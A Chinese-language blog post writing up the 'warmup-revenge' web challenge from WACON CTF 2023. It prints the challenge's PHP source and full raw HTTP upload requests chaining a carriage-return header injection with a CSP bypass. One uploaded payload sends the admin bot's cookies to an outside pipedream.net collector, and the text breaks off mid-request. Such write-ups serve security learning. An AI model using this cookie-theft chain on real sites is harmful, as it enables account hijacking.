

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="https:&#x2F;&#x2F;hackmd.io&#x2F;@sahuang&#x2F;rkHD37ZA3啥也没写出来，留个记录 warmup-revenge文件上传+xss 查看源代码，注意到有bot.js，打开文件有setCookie函数，确认xss可能有两个关键页面：download.php：用来下载上传的文件 123456789101112131415161718192021222324252627282930313233">
<meta property="og:type" content="article">
<meta property="og:title" content="2023&#x2F;09&#x2F;07：WACONCTF2023">
<meta property="og:url" content="http://example.com/2023/09/07/WACON2023/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="https:&#x2F;&#x2F;hackmd.io&#x2F;@sahuang&#x2F;rkHD37ZA3啥也没写出来，留个记录 warmup-revenge文件上传+xss 查看源代码，注意到有bot.js，打开文件有setCookie函数，确认xss可能有两个关键页面：download.php：用来下载上传的文件 123456789101112131415161718192021222324252627282930313233">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-09-07T07:50:14.000Z">
<meta property="article:modified_time" content="2023-09-10T07:39:37.403Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>2023/09/07：WACONCTF2023 - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2023/09/07：WACONCTF2023"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-09-07 15:50" pubdate>
          September 7, 2023 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          9.9k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          83 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">2023/09/07：WACONCTF2023</h1>
            
            
              <div class="markdown-body">
                
                <p><a target="_blank" rel="noopener" href="https://hackmd.io/@sahuang/rkHD37ZA3">https://hackmd.io/@sahuang/rkHD37ZA3</a><br>啥也没写出来，留个记录</p>
<h2 id="warmup-revenge"><a href="#warmup-revenge" class="headerlink" title="warmup-revenge"></a>warmup-revenge</h2><p>文件上传+xss</p>
<p>查看源代码，注意到有bot.js，打开文件有setCookie函数，确认xss可能<br>有两个关键页面：<br>download.php：用来下载上传的文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./config.php&#x27;</span>);<br>	<span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><br>	<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;idx&#x27;</span>])) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Not Found&#x27;</span>);<br>	<br>	<span class="hljs-variable">$query</span> = <span class="hljs-keyword">array</span>(<br>		<span class="hljs-string">&#x27;idx&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;idx&#x27;</span>]<br>	);<br><br>	<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fetch_row</span>(<span class="hljs-string">&#x27;board&#x27;</span>, <span class="hljs-variable">$query</span>);<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$file</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Not Found&#x27;</span>);<br><br>	<span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;file_path&#x27;</span>];<br>	<span class="hljs-variable">$original</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;file_name&#x27;</span>];<br><br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/msie/i&quot;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/5\.5/&quot;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>])) &#123;<br>	    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-length: &quot;</span>.<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filepath</span>));<br>	    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-disposition: attachment; filename=\&quot;<span class="hljs-subst">$original</span>\&quot;&quot;</span>);<br>	    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-transfer-encoding: binary&quot;</span>);<br>	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/Firefox/i&quot;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>]))&#123;<br>	    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-length: &quot;</span>.<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filepath</span>));<br>	    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-disposition: attachment; filename=\&quot;&quot;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;file_name&#x27;</span>]).<span class="hljs-string">&quot;\&quot;&quot;</span>);<br>	    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-description: php generated data&quot;</span>);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>	    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-length: &quot;</span>.<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filepath</span>));<br>	    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-disposition: attachment; filename=\&quot;<span class="hljs-subst">$original</span>\&quot;&quot;</span>);<br>	    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-description: php generated data&quot;</span>);<br>	&#125;<br>	<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;pragma: no-cache&quot;</span>);<br>	<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;expires: 0&quot;</span>);<br>	<span class="hljs-title function_ invoke__">flush</span>();<br><br>	<span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filepath</span>, <span class="hljs-string">&#x27;rb&#x27;</span>);<br><br>	<span class="hljs-variable">$download_rate</span> = <span class="hljs-number">10</span>;<br><br>	<span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123;<br>	    <span class="hljs-keyword">print</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$download_rate</span> * <span class="hljs-number">1024</span>));<br>	    <span class="hljs-title function_ invoke__">flush</span>();<br>	    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">1000</span>);<br>	&#125;<br>	<span class="hljs-title function_ invoke__">fclose</span> (<span class="hljs-variable">$fp</span>);<br>	<span class="hljs-title function_ invoke__">flush</span>();	<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>report.php：报告给bot以管理员身份访问</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_login</span>()) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;login plz&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == <span class="hljs-string">&quot;GET&quot;</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;idx&quot;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;report&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;report&quot;</span>] + <span class="hljs-number">30</span> &gt; <span class="hljs-title function_ invoke__">time</span>()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Too fast&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">fetch_row</span>(<span class="hljs-string">&#x27;board&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;idx&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;idx&#x27;</span>], <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]), <span class="hljs-string">&#x27;and&#x27;</span>))  &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not found&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-string">&quot;bot&quot;</span>);<br>            <span class="hljs-variable">$port</span> = <span class="hljs-number">5000</span>;<br>            <span class="hljs-variable">$socket</span> = <span class="hljs-title function_ invoke__">socket_create</span>(AF_INET, SOCK_STREAM, SOL_TCP);<br>    <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$socket</span> === <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error! plz contact admin&quot;</span>);<br>            &#125;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">socket_connect</span>(<span class="hljs-variable">$socket</span>, <span class="hljs-variable">$address</span>, <span class="hljs-variable">$port</span>);<br>    <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> === <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error! plz contact admin&quot;</span>);<br>            &#125;<br>            <span class="hljs-variable">$report_url</span> = <span class="hljs-string">&quot;http://webserver/&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>].<span class="hljs-string">&quot;?p=read&amp;idx=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;idx&#x27;</span>];<br>            <span class="hljs-title function_ invoke__">socket_write</span>(<span class="hljs-variable">$socket</span>, <span class="hljs-variable">$report_url</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$report_url</span>));<br>            <span class="hljs-title function_ invoke__">socket_close</span>(<span class="hljs-variable">$socket</span>);<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;report&quot;</span>] = <span class="hljs-title function_ invoke__">time</span>();<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;done&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid parameter&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nop&quot;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>首先要注意的是，我们有一个IDOR（不安全的直接对象引用），让我们通过ID访问任何文件来下载，并且某种CRLF（回车符）能让我们覆盖<code>content-disposition</code>，使响应为文件内容下载的内联页面而不是下载文件，并且没有在页面上显示内容使得 XSS 成为可能</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">header(<span class="hljs-string">&quot;content-disposition: attachment; filename=\&quot;</span>$original\<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>可以通过回车重写请求头，像这样：<code>asdf\rjunk.html</code><br>在<code>board.php</code>可以将文件以附件形式上传，代码如下：</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">$insert[<span class="hljs-string">&#x27;file_name&#x27;</span>] = $<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br></code></pre></td></tr></table></figure>
<p>存在回车绕过可能<br>存在CSP：</p>
<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">&#x27;self&#x27;</span>; <span class="hljs-keyword">style-src</span> <span class="hljs-string">&#x27;self&#x27;</span><br></code></pre></td></tr></table></figure>
<p>这个CSP允许我们包含来自同一个域的脚本，一个简单的绕过就是先上传一个包含javascript代码的文件来执行，然后再上传另一个文件来包含download.php页面上的js代码<br>第一个请求如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/board.php?p=write</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>58.225.56.195<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>681<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://58.225.56.195<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarydFZmSiashN04RJ1C<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://58.225.56.195/board.php?p=write<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=23c454a3f075dc9dc737e6fe71a98644<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;title&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">testy</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;content&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">asdf</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;level&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">1</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;myFile.html&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/html</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">document.<span class="hljs-keyword">location</span>=&quot;https://enwau6gu4zv3.x.pipedream.net/?x=&quot;.concat(encodeURIComponent(document.cookie));</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;password&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">benjeddou</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C--</span></span><br></code></pre></td></tr></table></figure>
<p>获得上传的文件：<a target="_blank" rel="noopener" href="http://58.225.56.195/download.php?idx=">http://58.225.56.195/download.php?idx=</a>…<br>上传第二个文件，其名称中包含回车符，以便将第一个文件作为脚本加载。<code>\r</code>在下面请求中被替换为回车，因为执行url编码不能正确工作，所以需要在burpsuite改变十六进制请求来注入回车。<br>第二个请求：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/board.php?p=write</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>58.225.56.195<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>681<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://58.225.56.195<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarydFZmSiashN04RJ1C<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://58.225.56.195/board.php?p=write<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=23c454a3f075dc9dc737e6fe71a98644<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;title&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">testy</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;content&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">asdf</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;level&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">1</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;AA\r.html&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/html</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script src=&quot;/download.php?idx=975&quot;&gt;&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;password&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">benjeddou</span><br><span class="language-pgsql"><span 